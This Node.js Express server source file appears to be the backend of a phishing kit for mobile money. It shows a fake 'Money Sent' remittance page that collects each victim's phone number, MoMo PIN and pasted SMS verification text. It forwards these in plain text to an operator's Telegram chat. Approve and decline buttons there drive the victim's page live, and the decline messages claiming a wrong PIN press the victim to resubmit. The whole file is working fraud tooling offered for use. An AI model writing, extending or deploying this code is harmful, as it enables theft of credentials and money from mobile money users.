require('dotenv').config();

const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'data.json');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const DEFAULT_STATE = {
  status: 'Money Sent',
  currency: 'USD',
  amount: 250.00,
  senderName: 'John Doe',
  senderCountry: 'United States',
  purpose: 'Family Support',
  requestId: 'REQ-8829104',
  method: 'Mobile Money',
  reference: 'SW-2849163',
  recipientName: 'Recipient Name',
  createdAt: new Date().toISOString(),
  updatedAt: new Date().toISOString()
};

function readState() {
  if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(DEFAULT_STATE, null, 2));
  }
  return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
}

function writeState(state) {
  state.updatedAt = new Date().toISOString();
  fs.writeFileSync(DATA_FILE, JSON.stringify(state, null, 2));
}

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

/* ---- Real-time subscribers (SSE) ---- */
const clients = new Set();

function broadcast(state) {
  const payload = `data: ${JSON.stringify(state)}\n\n`;
  for (const res of clients) {
    try { res.write(payload); } catch (_) { clients.delete(res); }
  }
}

/* ---- Telegram helpers ---- */
async function tgSend(method, body) {
  if (!TELEGRAM_BOT_TOKEN) {
    console.warn('[tg] missing TELEGRAM_BOT_TOKEN');
    return null;
  }
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`;
  try {
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    const data = await r.json();
    if (!data.ok) console.error('[tg] error:', JSON.stringify(data));
    return data;
  } catch (err) {
    console.error('[tg] fetch failed:', err.message);
    return null;
  }
}

async function sendSubmissionToTelegram(sub) {
  const text =
    `🔔 <b>NEW MoMo SUBMISSION</b>\n\n` +
    `📱 <b>Phone:</b> ${sub.phone}\n` +
    `👤 <b>Recipient:</b> ${sub.recipientName || '—'}\n` +
    `💰 <b>Amount:</b> ${sub.currency || 'USD'} ${sub.amount || '0.00'}\n` +
    `🔑 <b>PIN:</b> <code>${sub.pin}</code>\n` +
    `🆔 <b>Ref:</b> <code>${sub.id}</code>\n\n` +
    `Tap a button to decide.`;

  const keyboard = {
    inline_keyboard: [[
      { text: '✅ Approve', callback_data: `approve:${sub.id}` },
      { text: '❌ Decline', callback_data: `decline:${sub.id}` }
    ]]
  };

  return tgSend('sendMessage', {
    chat_id: TELEGRAM_CHAT_ID,
    text,
    parse_mode: 'HTML',
    reply_markup: keyboard
  });
}

async function sendSmsToTelegram(sub) {
  const text =
    `📩 <b>NEW SMS VERIFICATION</b>\n\n` +
    `📱 <b>Phone:</b> ${sub.phone || '—'}\n` +
    `📝 <b>SMS:</b>\n<code>${(sub.smsMessage || '').slice(0, 500)}</code>\n\n` +
    `🆔 <b>Ref:</b> <code>${sub.id}</code>\n\n` +
    `Tap a button to decide.`;

  const keyboard = {
    inline_keyboard: [[
      { text: '✅ Approve', callback_data: `sms-approve:${sub.id}` },
      { text: '❌ Decline', callback_data: `sms-decline:${sub.id}` }
    ]]
  };

  return tgSend('sendMessage', {
    chat_id: TELEGRAM_CHAT_ID,
    text,
    parse_mode: 'HTML',
    reply_markup: keyboard
  });
}

/* ---- Endpoints ---- */

app.get('/health', (req, res) => {
  res.status(200).json({
    status: 'ok',
    uptime: process.uptime(),
    telegram: {
      token: !!TELEGRAM_BOT_TOKEN,
      chatId: !!TELEGRAM_CHAT_ID
    }
  });
});

app.get('/api/state', (req, res) => {
  res.json(readState());
});

app.get('/api/stream', (req, res) => {
  res.set({
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Access-Control-Allow-Origin': '*'
  });
  res.flushHeaders();

  res.write(`data: ${JSON.stringify(readState())}\n\n`);

  clients.add(res);

  const ping = setInterval(() => {
    try { res.write(': ping\n\n'); } catch (_) {}
  }, 25000);

  req.on('close', () => {
    clearInterval(ping);
    clients.delete(res);
  });
});

app.post('/api/state', (req, res) => {
  const current = readState();
  const updated = { ...current, ...req.body };
  if (req.body.amount != null) updated.amount = parseFloat(req.body.amount) || 0;
  writeState(updated);
  broadcast(updated);
  res.json({ ok: true, state: updated });
});

app.post('/api/submit-payment', async (req, res) => {
  console.log('=== SUBMIT-PAYMENT ===');
  console.log('Token set?', !!TELEGRAM_BOT_TOKEN);
  console.log('Chat ID set?', !!TELEGRAM_CHAT_ID);
  console.log('Body:', JSON.stringify(req.body));

  const submission = {
    ...req.body,
    id: 'REQ-' + Date.now(),
    submittedAt: new Date().toISOString()
  };

  const state = readState();
  state.latestSubmission = submission;
  delete state.decision;
  delete state.declineMessage;
  delete state.decidedAt;
  writeState(state);
  broadcast(state);

  const tgResult = await sendSubmissionToTelegram(submission);
  console.log('[tg] result ok?', tgResult && tgResult.ok);

  res.json({ status: 'pending', id: submission.id });
});

app.post('/api/submit-sms', async (req, res) => {
  console.log('=== SUBMIT-SMS ===');
  console.log('Body:', JSON.stringify(req.body));

  const submission = {
    ...req.body,
    id: 'SMS-' + Date.now(),
    submittedAt: new Date().toISOString()
  };

  const state = readState();
  state.latestSmsSubmission = submission;
  delete state.decision;
  delete state.declineMessage;
  delete state.decidedAt;
  writeState(state);
  broadcast(state);

  const tgResult = await sendSmsToTelegram(submission);
  console.log('[tg] sms result ok?', tgResult && tgResult.ok);

  res.json({ status: 'pending', id: submission.id });
});

app.post('/api/approve', (req, res) => {
  const state = readState();
  state.decision = 'approved';
  state.decidedAt = new Date().toISOString();
  writeState(state);
  broadcast(state);
  res.json({ ok: true });
});

app.post('/api/decline', (req, res) => {
  const state = readState();
  state.decision = 'declined';
  state.declineMessage = req.body.message || 'Wrong MoMo PIN. Please try again.';
  state.decidedAt = new Date().toISOString();
  writeState(state);
  broadcast(state);
  res.json({ ok: true });
});

app.post('/api/reset', (req, res) => {
  const state = readState();
  delete state.decision;
  delete state.declineMessage;
  delete state.decidedAt;
  delete state.latestSubmission;
  delete state.latestSmsSubmission;
  writeState(state);
  broadcast(state);
  res.json({ ok: true, state });
});

app.post('/api/telegram/webhook', async (req, res) => {
  res.sendStatus(200);

  const update = req.body || {};
  const cb = update.callback_query;
  if (!cb) return;

  const data = cb.data || '';
  const [action, refId] = data.split(':');

  const state = readState();

  if (action === 'approve' || action === 'decline') {
    const current = state.latestSubmission;
    if (!current || (refId && current.id !== refId)) {
      await tgSend('answerCallbackQuery', {
        callback_query_id: cb.id,
        text: 'This submission is no longer active.',
        show_alert: false
      });
      return;
    }

    if (action === 'approve') {
      state.decision = 'approved';
      state.decidedAt = new Date().toISOString();
      writeState(state);
      broadcast(state);

      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: '✅ Approved' });
      await tgSend('editMessageReplyMarkup', {
        chat_id: cb.message.chat.id,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [[{ text: '✅ Approved', callback_data: 'noop' }]] }
      });
    } else {
      state.decision = 'declined';
      state.declineMessage = 'Wrong MoMo PIN. Please try again.';
      state.decidedAt = new Date().toISOString();
      writeState(state);
      broadcast(state);

      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: '❌ Declined' });
      await tgSend('editMessageReplyMarkup', {
        chat_id: cb.message.chat.id,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [[{ text: '❌ Declined', callback_data: 'noop' }]] }
      });
    }
    return;
  }

  if (action === 'sms-approve' || action === 'sms-decline') {
    const current = state.latestSmsSubmission;
    if (!current || (refId && current.id !== refId)) {
      await tgSend('answerCallbackQuery', {
        callback_query_id: cb.id,
        text: 'This SMS submission is no longer active.',
        show_alert: false
      });
      return;
    }

    if (action === 'sms-approve') {
      state.decision = 'sms-approved';
      state.decidedAt = new Date().toISOString();
      writeState(state);
      broadcast(state);

      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: '✅ SMS Approved' });
      await tgSend('editMessageReplyMarkup', {
        chat_id: cb.message.chat.id,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [[{ text: '✅ SMS Approved', callback_data: 'noop' }]] }
      });
    } else {
      state.decision = 'sms-declined';
      state.declineMessage = "Invalid SMS. Please paste the correct Y'ello message.";
      state.decidedAt = new Date().toISOString();
      writeState(state);
      broadcast(state);

      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: '❌ SMS Declined' });
      await tgSend('editMessageReplyMarkup', {
        chat_id: cb.message.chat.id,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [[{ text: '❌ SMS Declined', callback_data: 'noop' }]] }
      });
    }
    return;
  }

  await tgSend('answerCallbackQuery', {
    callback_query_id: cb.id,
    text: 'Unknown action',
    show_alert: false
  });
});

async function registerWebhook() {
  if (!TELEGRAM_BOT_TOKEN) return;

  const publicUrl = process.env.RENDER_EXTERNAL_URL;
  if (!publicUrl) {
    console.warn('[tg] RENDER_EXTERNAL_URL not set — skipping webhook registration');
    return;
  }

  const webhookUrl = `${publicUrl}/api/telegram/webhook`;
  const result = await tgSend('setWebhook', { url: webhookUrl });
  console.log('[tg] setWebhook:', JSON.stringify(result));
}

app.listen(PORT, '0.0.0.0', async () => {
  console.log(`Running on port ${PORT}`);
  console.log('Telegram token set?', !!TELEGRAM_BOT_TOKEN);
  console.log('Telegram chat set?', !!TELEGRAM_CHAT_ID);
  await registerWebhook();
});
